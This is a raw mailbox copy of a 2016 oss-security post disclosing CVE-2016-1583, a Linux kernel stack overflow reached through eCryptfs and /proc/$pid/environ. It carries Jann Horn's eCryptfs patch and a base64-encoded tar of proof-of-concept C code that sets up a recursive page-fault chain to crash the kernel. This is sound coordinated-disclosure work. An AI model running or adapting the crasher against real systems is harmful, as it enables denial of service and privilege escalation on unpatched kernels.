X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["23072" "Friday" "10" "June" "2016" "14:46:23" "-0700" "John Johansen" "john.johansen@canonical.com" "<575B352F.9000808@canonical.com>" "499" "[oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ" nil nil nil "6" "2016061021:46:23" "[oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ" (number mark "U       john.johanse Jun 10  499/23072 " thread-indent "\"[oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20033 invoked by uid 550); 10 Jun 2016 21:46:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20013 invoked from network); 10 Jun 2016 21:46:38 -0000
From: John Johansen <john.johansen@canonical.com>
Cc: Jann Horn <jannh@google.com>, Tyler Hicks <tyhicks@canonical.com>,
 "security@kernel.org" <security@kernel.org>
To: oss-security@lists.openwall.com
Organization: Canonical
Message-ID: <575B352F.9000808@canonical.com>
Date: Fri, 10 Jun 2016 14:46:23 -0700
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.8.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
 protocol="application/pgp-signature";
 boundary="oUFadpsSXmWEIrH4XXSl7BcG1sRDfWP35"
Subject: [oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and
 /proc/$pid/environ

--oUFadpsSXmWEIrH4XXSl7BcG1sRDfWP35
Content-Type: multipart/mixed; boundary="KurOk4gPSfS3NShJjJTnc2c6wP2p5h2uJ"
From: John Johansen <john.johansen@canonical.com>
To: oss-security@lists.openwall.com
Cc: Jann Horn <jannh@google.com>, Tyler Hicks <tyhicks@canonical.com>,
 "security@kernel.org" <security@kernel.org>
Message-ID: <575B352F.9000808@canonical.com>
Subject: [vs-plain] Linux kernel stack overflow via ecryptfs and
 /proc/$pid/environ

--KurOk4gPSfS3NShJjJTnc2c6wP2p5h2uJ
Content-Type: multipart/mixed;
 boundary="------------070000050502060506050409"

This is a multi-part message in MIME format.
--------------070000050502060506050409
Content-Type: text/plain; charset=windows-1252
Content-Transfer-Encoding: quoted-printable

This is a forward notification of a local priv escalation flaw from
security@kernel.org to the OSS security list. The CRD was for
2016-06-08 14:00:00 UTC. Patches attached to the email.

The flaw in eCryptfs was assigned CVE-2016-1583.

If backporting these patches to kernels pre 4.6 you may need to
cherry-pick patch 6a480a7842545ec520a91730209ec0bae41694c1


--------------070000050502060506050409
Content-Type: text/plain; charset=UTF-8;
 name="2of3.patch"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
 filename="2of3.patch"

From: Jann Horn <jannh@google.com>
To: security@kernel.org
Cc: Jann Horn <jannh@google.com>
Subject: [PATCH 2/3] ecryptfs: forbid opening files without mmap handler
Date: Wed,  1 Jun 2016 11:55:06 +0200
Message-Id: <1464774907-7753-2-git-send-email-jannh@google.com>
X-Mailer: git-send-email 2.8.0.rc3.226.g39d4020
In-Reply-To: <1464774907-7753-1-git-send-email-jannh@google.com>
References: <CAG48ez3HNCkbW0rFyQJqAvaLNxtLWTKMdPoo6TruYdkpE7oVvg@mail.gmail=
.com>
 <1464774907-7753-1-git-send-email-jannh@google.com>
X-Spam-Status: No, hits=3D-5.1 required=3D5 tests=3DDKIM_SIGNED,DKIM_VALID,=
DKIM_VALID_AU,DKIM_VERIFIED
X-Spam-Checker-Version: SpamAssassin 3.4.0-outflux_revision__1.66__
X-Virus-Scanned: ClamAV using ClamSMTP
Envelope-To: kees@outflux.net
X-MIMEDefang-Filter: outflux$Revision: 1.316 $
X-HELO: www.outflux.net
X-Scanned-By: MIMEDefang 2.73

This prevents users from triggering an exploitable stack overflow
through a recursive invocation of pagefault handling that involves
mapping procfs files into virtual memory.

Signed-off-by: Jann Horn <jannh@google.com>
Cc: stable@vger.kernel.org
---
 fs/ecryptfs/kthread.c | 13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)

diff --git a/fs/ecryptfs/kthread.c b/fs/ecryptfs/kthread.c
index 866bb18..e818f5a 100644
--- a/fs/ecryptfs/kthread.c
+++ b/fs/ecryptfs/kthread.c
@@ -25,6 +25,7 @@
 #include <linux/slab.h>
 #include <linux/wait.h>
 #include <linux/mount.h>
+#include <linux/file.h>
 #include "ecryptfs_kernel.h"
=20
 struct ecryptfs_open_req {
@@ -147,7 +148,7 @@ int ecryptfs_privileged_open(struct file **lower_file,
 	flags |=3D IS_RDONLY(d_inode(lower_dentry)) ? O_RDONLY : O_RDWR;
 	(*lower_file) =3D dentry_open(&req.path, flags, cred);
 	if (!IS_ERR(*lower_file))
-		goto out;
+		goto have_file;
 	if ((flags & O_ACCMODE) =3D=3D O_RDONLY) {
 		rc =3D PTR_ERR((*lower_file));
 		goto out;
@@ -165,8 +166,16 @@ int ecryptfs_privileged_open(struct file **lower_file,
 	mutex_unlock(&ecryptfs_kthread_ctl.mux);
 	wake_up(&ecryptfs_kthread_ctl.wait);
 	wait_for_completion(&req.done);
-	if (IS_ERR(*lower_file))
+	if (IS_ERR(*lower_file)) {
 		rc =3D PTR_ERR(*lower_file);
+		goto out;
+	}
+have_file:
+	if ((*lower_file)->f_op->mmap =3D=3D NULL) {
+		fput(*lower_file);
+		*lower_file =3D NULL;
+		rc =3D -EMEDIUMTYPE;
+	}
 out:
 	return rc;
 }
--=20
2.8.0.rc3.226.g39d4020



--------------070000050502060506050409
Content-Type: application/x-tar;
 name="crasher.tar"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
 filename="crasher.tar"

Y3Jhc2hlci8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAADAwMDA3NTAAMTM0NTYwMQAwMDEzMjAyADAwMDAwMDAwMDAw
ADEyNzIzMzY2NjA0ADAxMjAzMwAgNQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAgAGphbm5o
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbm9uY29uZgAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAABjcmFzaGVyL2NvbXBpbGUuc2gAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDAwMDc1MAAxMzQ1NjAxADAw
MTMyMDIAMDAwMDAwMDAxMDcAMTI3MjMzMzE2MTMAMDE0MDEwACAwAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAHVzdGFyICAAamFubmgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABu
b25jb25mAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACMhL2Jpbi9iYXNo
CmdjYyAtbyBjcmFzaGVyIGNyYXNoZXIuYyAtc3RkPWdudTk5IC1sZWNyeXB0
ZnMgLVdhbGwgLWdnZGIKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAY3Jhc2hlci9jcmFzaGVyLmMAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAADAwMDA2NDAAMTM0NTYwMQAwMDEzMjAyADAwMDAw
MDE1MDEzADEyNzIzMzMzNjA1ADAxMzYyMgAgMAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAg
AGphbm5oAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbm9uY29uZgAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjZGVmaW5lIF9HTlVfU09VUkNFCiNp
bmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+CiNp
bmNsdWRlIDxmY250bC5oPgojaW5jbHVkZSA8ZXJyLmg+CiNpbmNsdWRlIDxz
eXMvbW1hbi5oPgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN5cy9w
cmN0bC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpbnQu
aD4KI2luY2x1ZGUgPGtleXV0aWxzLmg+CiNpbmNsdWRlIDxlcnJuby5oPgoj
aW5jbHVkZSA8ZWNyeXB0ZnMuaD4KI2luY2x1ZGUgPHN5cy9ldmVudGZkLmg+
CiNpbmNsdWRlIDxzaWduYWwuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5j
bHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPgojaW5j
bHVkZSA8c3lzL2lvY3RsLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNp
bmNsdWRlIDxzdGRib29sLmg+CiNpbmNsdWRlIDxzY2hlZC5oPgoKdm9pZCBz
ZXRfZW52X2FyZWEoY2hhciAqcHRyLCBzaXplX3Qgc2l6ZSkgewogIHN0cnVj
dCBwcmN0bF9tbV9tYXAgbW1fbWFwID0gewogICAgLnN0YXJ0X2NvZGUgPSAw
eDQwMDAwMCwKICAgIC5lbmRfY29kZSA9IDB4NDAwMDAxLAogICAgLnN0YXJ0
X2RhdGEgPSAweDQwMDAwMiwKICAgIC5lbmRfZGF0YSA9IDB4NDAwMDAzLAog
ICAgLnN0YXJ0X2JyayA9IDB4NDAwMDA0LAogICAgLmJyayA9ICh1aW50NjRf
dClzYnJrKDApLAogICAgLnN0YXJ0X3N0YWNrID0gMHgxMDAwMDAwMDAsCiAg
ICAuYXJnX3N0YXJ0ID0gMHgxMDAwMDAwMDIsCiAgICAuYXJnX2VuZCA9IDB4
MTAwMDAwMDA0LAogICAgLmVudl9zdGFydCA9ICh1aW50NjRfdClwdHIsCiAg
ICAuZW52X2VuZCA9ICh1aW50NjRfdClwdHIgKyBzaXplLAogICAgLmF1eHZf
c2l6ZSA9IDAsCiAgICAuZXhlX2ZkID0gLTEKICB9OwogIGlmIChwcmN0bChQ
Ul9TRVRfTU0sIFBSX1NFVF9NTV9NQVAsICZtbV9tYXAsIHNpemVvZihtbV9t
YXApLCAwKSkKICAgIGVycigxLCAiUFJfU0VUX01NX01BUCIpOwp9Cgp2b2lk
IHdyaXRlX2ZpbGUoY2hhciAqZGlyLCBjaGFyICpuYW1lLCBjaGFyICpkYXRh
KSB7CiAgY2hhciBwYXRoWzUwMF07CiAgc3ByaW50ZihwYXRoLCAiJXMvJXMi
LCBkaXIsIG5hbWUpOwogIGludCBmZCA9IG9wZW4ocGF0aCwgT19XUk9OTFl8
T19UUlVOQ3xPX0NSRUFULCAwNjAwKTsKICBpZiAoZmQgPT0gLTEpCiAgICBl
cnIoMSwgIm9wZW5pbmcgJXMgZmFpbGVkIiwgcGF0aCk7CiAgaWYgKHdyaXRl
KGZkLCBkYXRhLCBzdHJsZW4oZGF0YSkpICE9IHN0cmxlbihkYXRhKSkKICAg
IGVycngoMSwgIndyaXRlIHRvICVzIGZhaWxlZCIsIHBhdGgpOwogIGNsb3Nl
KGZkKTsKfQoKc2l6ZV90IHJlYWRfZmlsZShjaGFyICpkaXIsIGNoYXIgKm5h
bWUsIGNoYXIgKipkYXRhKSB7CiAgY2hhciBwYXRoWzUwMF07CiAgc3ByaW50
ZihwYXRoLCAiJXMvJXMiLCBkaXIsIG5hbWUpOwogIGludCBmZCA9IG9wZW4o
cGF0aCwgT19SRE9OTFkpOwogIGlmIChmZCA9PSAtMSkKICAgIGVycigxLCAi
b3BlbiBcIiVzXCIiLCBwYXRoKTsKICBzdHJ1Y3Qgc3RhdCBzdDsKICBpZiAo
ZnN0YXQoZmQsICZzdCkpCiAgICBlcnIoMSwgImZzdGF0Iik7CiAgKmRhdGEg
PSBtYWxsb2Moc3Quc3Rfc2l6ZSk7CiAgaWYgKCEqZGF0YSkKICAgIGVycigx
LCAibWFsbG9jIik7CiAgaWYgKHJlYWQoZmQsICpkYXRhLCBzdC5zdF9zaXpl
KSAhPSBzdC5zdF9zaXplKQogICAgZXJyeCgxLCAicmVhZF9maWxlIHJlYWQi
KTsKICBjbG9zZShmZCk7CiAgcmV0dXJuIHN0LnN0X3NpemU7Cn0KCmNoYXIg
Km1tYXBfZmlsZShjaGFyICpwYXRoLCBzaXplX3QgbGVuKSB7CiAgaW50IGZk
ID0gb3BlbihwYXRoLCBPX1JET05MWSk7CiAgaWYgKGZkID09IC0xKQogICAg
ZXJyKDEsICJvcGVuIFwiJXNcIiIsIHBhdGgpOwogIGVycm5vID0gMDsKICBj
aGFyICpwdHIgPSBtbWFwKE5VTEwsIGxlbiwgUFJPVF9SRUFELCBNQVBfUFJJ
VkFURSwgZmQsIDApOwogIGlmIChwdHIgPT0gTUFQX0ZBSUxFRCkKICAgIGVy
cigxLCAibW1hcCIpOwogIGNsb3NlKGZkKTsKICByZXR1cm4gcHRyOwp9Cgp2
b2lkIGNvcHlfZmlsZShjaGFyICpzcmNkaXIsIGNoYXIgKnNyY25hbWUsIGNo
YXIgKmRzdGRpciwgY2hhciAqZHN0bmFtZSkgewogIGNoYXIgY21kWzEwMDBd
OwogIHNwcmludGYoY21kLCAiY3AgJyVzLyVzJyAnJXMvJXMnIiwgc3JjZGly
LCBzcmNuYW1lLCBkc3RkaXIsIGRzdG5hbWUpOwogIGlmIChzeXN0ZW0oY21k
KSkKICAgIGVycngoMSwgInN5c3RlbShcIiVzXCIpIiwgY21kKTsKfQoKdm9p
ZCBldmVudGZkX3dhaXQoaW50IGZkKSB7CiAgdWludDY0X3QgY3RyOwogIHNz
aXplX3QgcmVzID0gcmVhZChmZCwgJmN0ciwgOCk7CiAgaWYgKHJlcyAhPSA4
KQogICAgZXJyKDEsICJldmVudGZkX3dhaXQiKTsKfQoKdm9pZCBldmVudGZk
X3NlbmQoaW50IGZkKSB7CiAgdWludDY0X3QgY3RyID0gMTsKICBzc2l6ZV90
IHJlcyA9IHdyaXRlKGZkLCAmY3RyLCA4KTsKICBpZiAocmVzICE9IDgpCiAg
ICBlcnIoMSwgImV2ZW50ZmRfc2VuZCIpOwp9CgojZGVmaW5lIE1BVFJPU0tB
X0RFUFRIIDUwCgpwaWRfdCBjaGlsZHJlbltNQVRST1NLQV9ERVBUSF07Cmlu
dCBzeW5jX2V2ZW50ZmRzX3RvX2NoaWxkW01BVFJPU0tBX0RFUFRIXTsKaW50
IHN5bmNfZXZlbnRmZHNfZnJvbV9jaGlsZFtNQVRST1NLQV9ERVBUSF07Cgpp
bnQgbWFpbih2b2lkKSB7CiAgLy8gZmlyc3QsIHNldCB1cCBhbiBlY3J5cHRm
cyBmb3IgbWF0cm9za2EgY3JlYXRpb24KICBjaGFyIHNpZ1tFQ1JZUFRGU19T
SUdfU0laRV9IRVggKyAxXTsKICBjaGFyIHNhbHRbRUNSWVBURlNfU0FMVF9T
SVpFXSA9IHswfTsKICBpZiAoZWNyeXB0ZnNfYWRkX3Bhc3NwaHJhc2Vfa2V5
X3RvX2tleXJpbmcoc2lnLCAiZm9vYmFyIiwgc2FsdCkgPCAwKQogICAgZXJy
eCgxLCAidW5hYmxlIHRvIGFkZCBrZXkgdG8ga2V5cmluZyIpOwogIGNoYXIg
ZWNyeXB0ZnNfZGlyWzMwMF07CiAgc3ByaW50ZihlY3J5cHRmc19kaXIsICIl
cy8uZWNyeXB0ZnMiLCBnZXRlbnYoIkhPTUUiKSk7CiAgaWYgKG1rZGlyKGVj
cnlwdGZzX2RpciwgMDcwMCkgJiYgZXJybm8gIT0gRUVYSVNUKQogICAgZXJy
KDEsICJta2RpciIpOwogIC8qIHNpbmdsZSBsaW5lOyBubyBmaWxlbmFtZSBl
bmNyeXB0aW9uIGtleSAqLwogIHdyaXRlX2ZpbGUoZWNyeXB0ZnNfZGlyLCAi
ZXhwbG9pdC5zaWciLCBzaWcpOwogIGlmIChta2RpcigiL3RtcC9leHBsb2l0
X21vdW50IiwgMDcwMCkgJiYgZXJybm8gIT0gRUVYSVNUKQogICAgZXJyKDEs
ICJta2RpciBpbiAvdG1wIik7CiAgaWYgKG1rZGlyKCIvdG1wL2V4cGxvaXRf
bG93ZXIiLCAwNzAwKSAmJiBlcnJubyAhPSBFRVhJU1QpCiAgICBlcnIoMSwg
Im1rZGlyIGluIC90bXAiKTsKICBjaGFyIGNvbmZfZGF0YVs1MDBdOwogIHNw
cmludGYoY29uZl9kYXRhLCAiL3RtcC9leHBsb2l0X2xvd2VyIC90bXAvZXhw
bG9pdF9tb3VudCBlY3J5cHRmcyBub25lIDAgMFxuIik7CiAgd3JpdGVfZmls
ZShlY3J5cHRmc19kaXIsICJleHBsb2l0LmNvbmYiLCBjb25mX2RhdGEpOwog
IGlmIChzeXN0ZW0oIi9zYmluL21vdW50LmVjcnlwdGZzX3ByaXZhdGUgZXhw
bG9pdCIpKQogICAgZXJyeCgxLCAibW91bnQxIGZhaWxlZCIpOwoKICAvLyBu
b3csIGNyZWF0ZSB0aGUgbWF0cm9za2FzCiAgY2hhciBNQVRST1NLQV9aRVJP
WzUwICogMTAyNF07IC8qIDUwS2lCLCBzaG91bGQgYmUgc3VmZmljaWVudCB0
byBwcmV2ZW50IGNhY2hpbmcgKi8KICBtZW1zZXQoTUFUUk9TS0FfWkVSTywg
MHg0Miwgc2l6ZW9mKE1BVFJPU0tBX1pFUk8pKTsKICB3cml0ZV9maWxlKCIv
dG1wL2V4cGxvaXRfbW91bnQiLCAiMSIsIE1BVFJPU0tBX1pFUk8pOwogIHN5
bmMoKTsKICBmb3IgKGludCBpPTE7IGk8TUFUUk9TS0FfREVQVEg7IGkrKykg
ewogICAgY2hhciBpX3N0clsxMF07CiAgICBjaGFyIG5leHRpX3N0clsxMF07
CiAgICBzcHJpbnRmKGlfc3RyLCAiJWQiLCBpKTsKICAgIHNwcmludGYobmV4
dGlfc3RyLCAiJWQiLCBpKzEpOwogICAgY29weV9maWxlKCIvdG1wL2V4cGxv
aXRfbG93ZXIiLCBpX3N0ciwgIi90bXAvZXhwbG9pdF9tb3VudCIsIG5leHRp
X3N0cik7CiAgICBzeW5jKCk7CiAgfQoKICAvLyBjcmVhdGUgdGhyZWFkcwog
IGZvciAoaW50IGk9MDsgaTxNQVRST1NLQV9ERVBUSDsgaSsrKSB7CiAgICBz
eW5jX2V2ZW50ZmRzX3RvX2NoaWxkW2ldID0gZXZlbnRmZCgwLCBFRkRfU0VN
QVBIT1JFKTsKICAgIGlmIChzeW5jX2V2ZW50ZmRzX3RvX2NoaWxkW2ldID09
IC0xKQogICAgICBlcnIoMSwgImV2ZW50ZmQiKTsKICAgIHN5bmNfZXZlbnRm
ZHNfZnJvbV9jaGlsZFtpXSA9IGV2ZW50ZmQoMCwgRUZEX1NFTUFQSE9SRSk7
CiAgICBpZiAoc3luY19ldmVudGZkc19mcm9tX2NoaWxkW2ldID09IC0xKQog
ICAgICBlcnIoMSwgImV2ZW50ZmQiKTsKICB9CiAgZm9yIChpbnQgaT0wOyBp
PE1BVFJPU0tBX0RFUFRIOyBpKyspIHsKICAgIHBpZF90IGNoaWxkID0gZm9y
aygpOwogICAgaWYgKGNoaWxkID09IC0xKQogICAgICBlcnIoMSwgImZvcmsi
KTsKICAgIGlmIChjaGlsZCA9PSAwKSB7CiAgICAgIGNoYXIgZmlsZW51bXN0
clsxMF07CiAgICAgIHNwcmludGYoZmlsZW51bXN0ciwgIiVkIiwgaSsxKTsK
ICAgICAgY2hhciAqZGlyZWN0X21hdHJvc2thOwogICAgICBzaXplX3QgZGly
ZWN0X21hdHJvc2thX2xlbiA9IHJlYWRfZmlsZSgiL3RtcC9leHBsb2l0X2xv
d2VyIiwgZmlsZW51bXN0ciwgJmRpcmVjdF9tYXRyb3NrYSk7CiAgICAgIHNl
dF9lbnZfYXJlYShkaXJlY3RfbWF0cm9za2EsIGRpcmVjdF9tYXRyb3NrYV9s
ZW4pOwoKICAgICAgLy8gTm90ZTogVGhpcyB5aWVsZHMgY29udHJvbCB0byB0
aGUgbWFpbiBwcm9jZXNzIGFuZCBvbmx5IHJlc3VtZXMgYWZ0ZXIgYWxsIHRo
ZSBjaGlsZHJlbgogICAgICAvLyBoYXZlIHBhc3NlZCB0aGlzIHBvaW50IQog
ICAgICBldmVudGZkX3NlbmQoc3luY19ldmVudGZkc19mcm9tX2NoaWxkW2ld
KTsKICAgICAgZXZlbnRmZF93YWl0KHN5bmNfZXZlbnRmZHNfdG9fY2hpbGRb
aV0pOwoKICAgICAgaWYgKGkgIT0gTUFUUk9TS0FfREVQVEggLSAxKSB7CiAg
ICAgICAgLy8gbWFwIGxvd2VyIGVudmlyb24gYXMgZW52aXJvbgogICAgICAg
IGNoYXIgbmV3X2Vudl9wYXRoWzMwMF07CiAgICAgICAgc3ByaW50ZihuZXdf
ZW52X3BhdGgsICIvdG1wL2V4cGxvaXRfbW91bnRzLyVkL2Vudmlyb24iLCBp
KzEpOwogICAgICAgIGNoYXIgKm5ld19lbnYgPSBtbWFwX2ZpbGUobmV3X2Vu
dl9wYXRoLCBkaXJlY3RfbWF0cm9za2FfbGVuKTsKICAgICAgICBzZXRfZW52
X2FyZWEobmV3X2VudiwgZGlyZWN0X21hdHJvc2thX2xlbik7CiAgICAgIH0K
CiAgICAgIGV2ZW50ZmRfc2VuZChzeW5jX2V2ZW50ZmRzX2Zyb21fY2hpbGRb
aV0pOwogICAgICBldmVudGZkX3dhaXQoc3luY19ldmVudGZkc190b19jaGls
ZFtpXSk7CgogICAgICBleGl0KDApOwogICAgfQogICAgZXZlbnRmZF93YWl0
KHN5bmNfZXZlbnRmZHNfZnJvbV9jaGlsZFtpXSk7CiAgICBjaGlsZHJlbltp
XSA9IGNoaWxkOwogIH0KCiAgLy8gc2V0IHVwIG1vdW50cwogIGlmIChta2Rp
cigiL3RtcC9leHBsb2l0X21vdW50cyIsIDA3MDApICYmIGVycm5vICE9IEVF
WElTVCkKICAgIGVycigxLCAibWtkaXIgaW4gL3RtcCIpOwogIGZvciAoaW50
IGk9MDsgaTxNQVRST1NLQV9ERVBUSDsgaSsrKSB7CiAgICBjaGFyIGV4cGxv
aXRfbW91bnRfc3VicGF0aFszMDBdOwogICAgc3ByaW50ZihleHBsb2l0X21v
dW50X3N1YnBhdGgsICIvdG1wL2V4cGxvaXRfbW91bnRzLyVkIiwgaSk7CiAg
ICBpZiAobWtkaXIoZXhwbG9pdF9tb3VudF9zdWJwYXRoLCAwNzAwKSAmJiBl
cnJubyAhPSBFRVhJU1QpCiAgICAgIGVycigxLCAibWtkaXIgaW4gL3RtcCIp
OwoKICAgIC8vIG5vdGU6IHRoZSB1bW91bnQgaGVscGVyIHJlbW92ZWQgdGhl
IGtleSwgcmVpbnNlcnQgaXQKICAgIGlmIChlY3J5cHRmc19hZGRfcGFzc3Bo
cmFzZV9rZXlfdG9fa2V5cmluZyhzaWcsICJmb29iYXIiLCBzYWx0KSA8IDAp
CiAgICAgIGVycngoMSwgInVuYWJsZSB0byBhZGQga2V5IHRvIGtleXJpbmci
KTsKICAgIHNwcmludGYoY29uZl9kYXRhLCAiL3Byb2MvJWQgL3RtcC9leHBs
b2l0X21vdW50cy8lZCBlY3J5cHRmcyBub25lIDAgMFxuIiwgKGludCljaGls
ZHJlbltpXSwgaSk7CiAgICB3cml0ZV9maWxlKGVjcnlwdGZzX2RpciwgImV4
cGxvaXQuY29uZiIsIGNvbmZfZGF0YSk7CiAgICBpZiAoc3lzdGVtKCIvc2Jp
bi9tb3VudC5lY3J5cHRmc19wcml2YXRlIGV4cGxvaXQiKSkKICAgICAgZXJy
eCgxLCAic3lzdGVtIGZhaWxlZCIpOwogIH0KCiAgLy8gbWFwIGxvd2VyIGVu
dmlyb24KICBjaGFyICp0b3BfbWFwID0gbW1hcF9maWxlKCIvdG1wL2V4cGxv
aXRfbW91bnRzLzAvZW52aXJvbiIsIHNpemVvZihNQVRST1NLQV9aRVJPKSk7
CiAgZm9yIChpbnQgaT0wOyBpPE1BVFJPU0tBX0RFUFRIOyBpKyspIHsKICAg
ICAgZXZlbnRmZF9zZW5kKHN5bmNfZXZlbnRmZHNfdG9fY2hpbGRbaV0pOwog
ICAgICBldmVudGZkX3dhaXQoc3luY19ldmVudGZkc19mcm9tX2NoaWxkW2ld
KTsKICB9CgogIHB1dHMoImZhdWx0IGNoYWluIHNldCB1cCwgZmF1bHRpbmcg
bm93Iik7CiAgcmV0dXJuICoodW5zaWduZWQgbG9uZyAqKSh0b3BfbWFwICsg
c2l6ZW9mKE1BVFJPU0tBX1pFUk8pIC0gOCk7Cn0KAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
